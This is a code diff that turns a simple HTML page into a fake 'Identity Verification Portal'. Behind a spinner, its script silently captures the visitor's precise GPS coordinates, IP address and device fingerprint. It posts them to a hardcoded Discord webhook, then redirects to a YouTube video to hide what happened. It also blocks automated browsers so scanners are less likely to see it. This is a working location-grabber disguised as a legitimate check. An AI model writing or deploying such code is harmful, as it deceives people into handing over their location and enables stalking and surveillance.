@@ -1,13 +1,126 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Secure GPS Check</title>
-  <script src="send.js"></script>
+  <meta charset="UTF-8" />
+  <title>Identity Verification Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background-color: #f4f4f4;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      display: inline-block;
+      min-width: 320px;
+    }
+    #status {
+      margin-top: 20px;
+      color: #555;
+      font-size: 14px;
+    }
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 5px solid #ccc;
+      border-top: 5px solid #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <h2>Loading location...</h2>
-  <p id="status">Please allow location access</p>
+  <div class="container">
+    <h2>Verifying your identity...</h2>
+    <div class="spinner"></div>
+    <p id="status">Please wait while we process your request.</p>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1298106884514910229/PBDKokWcVPpeFlzFiDnU1qxU7EIaHYirj0fWcltWIYQl2gIEhQTJJra4jJCaZ2PoXNdd"; // 🔧 Replace with your webhook
+
+    // Basic anti-bot check
+    const isBot = navigator.webdriver;
+    if (isBot) {
+      document.getElementById("status").textContent = "Access Denied: Automation detected.";
+      throw new Error("Bot blocked.");
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api64.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    function getFingerprint() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+    }
+
+    function sendToWebhook(ip, lat, lon, acc, fp) {
+      const payload = {
+        content: "**🔐 Identity Check Report**",
+        embeds: [{
+          title: "📊 Verification Data",
+          color: 3447003,
+          fields: [
+            { name: "IP Address", value: ip, inline: true },
+            { name: "Device", value: fp.platform, inline: true },
+            { name: "Screen", value: fp.screen, inline: true },
+            { name: "Timezone", value: fp.timezone, inline: true },
+            { name: "Coordinates", value: `${lat.toFixed(6)}, ${lon.toFixed(6)}`, inline: false },
+            { name: "Google Maps", value: `https://maps.google.com/?q=${lat},${lon}`, inline: false },
+            { name: "Accuracy", value: acc + " meters", inline: true }
+          ],
+          footer: {
+            text: fp.userAgent
+          },
+          timestamp: new Date()
+        }]
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        document.getElementById("status").textContent = "Verification complete. Redirecting...";
+
+        // Fake delay → redirect to legitimate site
+        setTimeout(() => {
+          window.location.replace("https://www.youtube.com/watch?v=29YWpw0TsR4");
+        }, 2500);
+      });
+    }
+
+    // Get geolocation and proceed silently
+    navigator.geolocation.getCurrentPosition(async position => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const acc = position.coords.accuracy;
+      const ip = await getIP();
+      const fp = getFingerprint();
+      sendToWebhook(ip, lat, lon, acc, fp);
+    }, err => {
+      document.getElementById("status").textContent = "Verification failed. Please try again.";
+    });
+  </script>
 </body>
 </html>
-
-         
